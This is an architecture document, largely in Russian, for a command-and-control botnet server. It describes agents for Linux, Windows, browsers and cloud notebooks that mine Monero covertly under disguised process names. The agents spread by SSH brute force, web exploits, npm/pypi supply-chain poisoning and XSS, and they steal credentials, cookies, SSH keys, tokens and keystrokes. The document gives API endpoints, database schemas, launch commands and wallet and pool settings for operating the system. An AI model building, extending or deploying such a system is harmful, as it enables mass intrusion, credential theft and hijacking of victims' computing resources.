# C2 Server - Global Domination Architecture

## ─── СИСТЕМНАЯ АРХИТЕКТУРА ───

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           C2 SERVER (Flask)                                  │
│                         /mnt/F/C2_server-main                                │
│                                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │   Dashboard │  │  REST API   │  │  WebSocket  │  │  Database   │         │
│  │  (HTML/JS)  │  │  (Flask)    │  │  (SocketIO) │  │  (SQLite)   │         │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘         │
│         │                │                │                │                 │
│         └────────────────┴────────────────┴────────────────┘                 │
│                                    │                                         │
└────────────────────────────────────┼─────────────────────────────────────────┘
                                     │
                    ┌────────────────┴────────────────┐
                    │         API Endpoints           │
                    │                                 │
                    │ /api/agents/*     - Управление агентами
                    │ /api/global/*     - Глобальная сеть
                    │ /api/mining/*     - Майнинг
                    │ /api/domination/* - Глобальный захват
                    │ /api/agent/*      - Агентские задачи
                    └────────────────┬────────────────┘
                                     │
        ┌────────────────────────────┼────────────────────────────┐
        │                            │                            │
        ▼                            ▼                            ▼
┌───────────────┐          ┌───────────────┐          ┌───────────────┐
│  UNIVERSAL    │          │   BROWSER     │          │    CLOUD      │
│    AGENT      │          │    AGENT      │          │    AGENTS     │
│  (Python)     │          │ (JavaScript)  │          │   (Python)    │
│               │          │               │          │               │
│ Linux/Windows │          │ Chrome/Firefox│          │ Kaggle/Colab │
│ macOS/VM/     │          │ Edge/Safari   │          │ Modal/Paperspace│
│ Container     │          │               │          │               │
└───────┬───────┘          └───────┬───────┘          └───────┬───────┘
        │                          │                          │
        │                          │                          │
        ▼                          ▼                          ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         ФУНКЦИИ АГЕНТОВ                                      │
│                                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │   Stealth   │  │ Propagation │  │    Data     │  │   Command   │         │
│  │   Mining    │  │   (Spread)  │  │ Collection  │  │  Execution  │         │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘         │
│                                                                              │
│  • CPU/GPU майнинг (XMRig)     • SSH brute force      • Credentials         │
│  • Stealth режим (маскировка)  • Web exploits         • Browser data        │
│  • Auto-throttle              • Supply chain         • Files               │
│  • Process hiding             • XSS propagation      • System info         │
│                                • USB/Bluetooth        • Keylogger           │
│                                • Phishing                                   │
└─────────────────────────────────────────────────────────────────────────────┘
```

## ─── ПОТОК ДАННЫХ ───

```
1. РЕГИСТРАЦИЯ АГЕНТА
   ┌─────────┐    POST /api/agent/register    ┌─────────┐
   │  Agent  │ ──────────────────────────────► │   C2    │
   │         │    {agent_id, platform, info}   │  Server │
   └─────────┘                                 └─────────┘
                                                        │
                                                        ▼
                                                   SQLite DB
                                                   agents table

2. BEACON (Heartbeat)
   ┌─────────┐    GET /api/agent/beacon      ┌─────────┐
   │  Agent  │ ◄──────────────────────────── │   C2    │
   │         │    {tasks: [...]}             │  Server │
   └─────────┘                                └─────────┘
        │
        └──► Каждые 30 сек + jitter

3. ВЫПОЛНЕНИЕ ЗАДАЧИ
   ┌─────────┐    POST /api/agent/result    ┌─────────┐
   │  Agent  │ ────────────────────────────►│   C2    │
   │         │    {task_id, result}         │  Server │
   └─────────┘                               └─────────┘
                                                   │
                                                   ▼
                                              WebSocket emit
                                              to Dashboard

4. STEALTH MINING
   ┌─────────┐    Задача: stealth_mining_start    ┌─────────┐
   │  Agent  │ ◄───────────────────────────────── │   C2    │
   │         │    {wallet, pool, throttle}        │  Server │
   └─────────┘                                     └─────────┘
        │
        ├──► Скачать XMRig
        ├──► Замаскировать под systemd-udevd/cron/nginx
        ├──► Запуск с low priority (nice -n 19)
        └──► Отчёт hashrate в C2

5. PROPAGATION (Распространение)
   ┌─────────┐    Задача: propagate           ┌─────────┐
   │  Agent  │ ◄───────────────────────────── │   C2    │
   │         │    {method: "network/ssh/web"} │  Server │
   └─────────┘                                 └─────────┘
        │
        ├──► Network scan (192.168.x.x)
        ├──► SSH brute force
        ├──► Web exploit (RCE)
        ├──► Supply chain (npm/pypi)
        └──► Новые агенты регистрируются в C2

6. DATA COLLECTION
   ┌─────────┐    Задача: collect            ┌─────────┐
   │  Agent  │ ◄───────────────────────────── │   C2    │
   │         │    {collect_type: "all"}      │  Server │
   └─────────┘                                 └─────────┘
        │
        ├──► Credentials (browser, system)
        ├──► Cookies, localStorage
        ├──► SSH keys, API tokens
        └──► Отправка в /api/agent/data

7. GLOBAL DOMINATION (Полный захват)
   ┌─────────┐    POST /api/domination/activate    ┌─────────┐
   │Operator │ ────────────────────────────────────►│   C2    │
   │Dashboard│                                      │  Server │
   └─────────┘                                      └─────────┘
                                                          │
                                                          ▼
              ┌───────────────────────────────────────────┴────────┐
              │                    Все агенты                       │
              │                                                     │
              ▼                       ▼                             ▼
        ┌──────────┐           ┌──────────┐                  ┌──────────┐
        │ Stealth  │           │ Propagate│                  │  Collect │
        │  Mining  │           │   Loop   │                  │   Loop   │
        │ (30% CPU)│           │(5-30 min)│                  │ (1 hour) │
        └──────────┘           └──────────┘                  └──────────┘
```

## ─── ФАЙЛЫ СИСТЕМЫ ───

```
/mnt/F/C2_server-main/
│
├── src/
│   ├── c2/
│   │   └── server.py              # Main C2 server (Flask)
│   │       ├── API endpoints
│   │       ├── WebSocket handlers
│   │       ├── Database queries
│   │       └── Authentication
│   │
│   ├── agents/
│   │   ├── universal.py           # Universal Agent (Python)
│   │   │   ├── Stealth mining
│   │   │   ├── Propagation
│   │   │   ├── Data collection
│   │   │   └── Task execution
│   │   │
│   │   └── cloud/
│   │       ├── browser_mining.py  # Browser miner JS generator
│   │       ├── modal.py           # Modal GPU mining
│   │       ├── paperspace.py      # Paperspace GPU
│   │       └── mybinder.py        # MyBinder notebooks
│   │
│   └── autoreg/
│       └── engine.py              # Auto-registration engine
│           └── PLATFORMS dict    # 25+ platforms
│
├── static/
│   ├── js/
│   │   └── agent_browser.js       # Browser Agent (JavaScript)
│   │       ├── Fingerprinting
│   │       ├── Cookie collection
│   │       ├── Keylogger
│   │       └── XSS propagation
│   │
│   └── mining/
│       └── inject.html           # Browser mining injection
│
├── data/
│   └── c2.db                      # SQLite database
│       ├── agents                 # Зарегистрированные агенты
│       ├── tasks                  # Задачи для агентов
│       ├── agent_data             # Собранные данные
│       └── logs                   # Логи системы
│
├── templates/
│   └── dashboard.html             # Web dashboard (создать)
│
└── run_unified.py                 # Entry point
```

## ─── API ENDPOINTS ───

### Управление агентами
```
GET  /api/agents              # Список всех агентов
GET  /api/agents/<id>         # Информация об агенте
POST /api/agent/register      # Регистрация агента
GET  /api/agent/tasks         # Получить задачи
POST /api/agent/result        # Отправить результат
POST /api/agent/data          # Отправить данные
```

### Глобальная сеть
```
GET  /api/global/stats        # Статистика сети
GET  /api/global/agents       # Список агентов с фильтрами
POST /api/global/broadcast    # Рассылка задач
POST /api/global/propagate    # Запуск распространения
POST /api/global/collect      # Запуск сбора данных
```

### Stealth Mining
```
POST /api/mining/stealth/start    # Запуск майнинга
POST /api/mining/stealth/stop     # Остановка
GET  /api/mining/stealth/status   # Статус
POST /api/mining/browser/beacon   # Beacon от браузеров
GET  /api/mining/browser/stats    # Статистика браузеров
```

### Global Domination
```
POST /api/domination/activate     # Активация захвата
GET  /api/domination/status       # Статус сети
GET  /api/domination/wallet       # Кошельки
GET  /api/domination/estimate     # Оценка дохода
```

## ─── ЗАПУСК СИСТЕМЫ ───

```bash
# 1. Запуск C2 сервера
cd /mnt/F/C2_server-main
python3 run_unified.py --host 0.0.0.0 --port 5000

# 2. Доступ к Dashboard
http://localhost:5000/

# 3. Логин
Username: admin
Password: admin

# 4. API доступ
curl http://localhost:5000/api/health
curl http://localhost:5000/api/global/stats
```

## ─── КОНФИГУРАЦИЯ АГЕНТА ───

```python
# Переменные окружения агента
C2_URL="http://your-server:5000"    # URL C2 сервера
TG_BOT_TOKEN="..."                   # Telegram bot token (опционально)
TG_CHAT_ID="..."                     # Telegram chat ID (опционально)
SLEEP=30                             # Интервал beacon (сек)
JITTER=5                             # Случайная задержка (%)
GLOBAL_WALLET="44h..."               # XMR кошелёк
GLOBAL_POOL="pool.hashvault.pro:80"  # Mining pool
```

## ─── БАЗА ДАННЫХ ───

### Таблица agents
```sql
CREATE TABLE agents (
    id TEXT PRIMARY KEY,           -- UUID агента
    agent_id TEXT UNIQUE,          -- ID для API
    platform TEXT,                 -- linux/windows/macos/browser
    hostname TEXT,                 -- Имя хоста
    ip_address TEXT,               -- IP адрес
    metadata TEXT,                 -- JSON с информацией
    created_at TEXT,               -- Время регистрации
    last_seen TEXT                 -- Последний beacon
);
```

### Таблица tasks
```sql
CREATE TABLE tasks (
    id TEXT PRIMARY KEY,
    agent_id TEXT,                 -- ID агента
    task_type TEXT,                -- Тип задачи
    payload TEXT,                  -- Параметры (JSON)
    status TEXT,                   -- pending/completed/failed
    result TEXT,                   -- Результат выполнения
    created_at TEXT,
    completed_at TEXT
);
```

### Таблица agent_data
```sql
CREATE TABLE agent_data (
    id INTEGER PRIMARY KEY,
    agent_id TEXT,
    data_type TEXT,                -- beacon/exfil/credentials/browser_mining
    data TEXT,                     -- JSON данные
    collected_at TEXT
);
```

## ─── WEBSOCKET СОБЫТИЯ ───

```javascript
// Клиент подписывается на события
socket.on('agent_registered', (data) => {
    // Новый агент зарегистрирован
});

socket.on('task_result', (data) => {
    // Результат выполнения задачи
});

socket.on('global_domination', (data) => {
    // Активация глобального захвата
});

socket.on('mining_stats', (data) => {
    // Статистика майнинга
});
```
